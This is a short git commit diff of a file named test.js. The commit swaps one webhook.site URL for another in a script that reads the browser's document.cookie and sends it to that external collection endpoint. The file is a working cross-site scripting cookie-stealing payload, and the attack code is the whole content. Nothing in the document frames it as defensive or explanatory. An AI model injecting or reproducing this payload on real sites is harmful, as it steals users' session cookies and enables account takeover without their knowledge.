0749829a88c407920c8bd19746a7fe0d1311c69d
wldldlq <smjy01@gmail.com>
2024-09-26 16:08:54 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,4 +1,4 @@
 var cookieValue = document.cookie;
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://webhook.site/44750bd9-9817-43ec-9086-bab8119e97a3?q=" + encodeURIComponent(cookieValue), true);
+xhr.open("GET", "https://webhook.site/8198bfcb-4a79-4d3f-8e60-1fafa57145a9?q=" + encodeURIComponent(cookieValue), true);
 xhr.send();
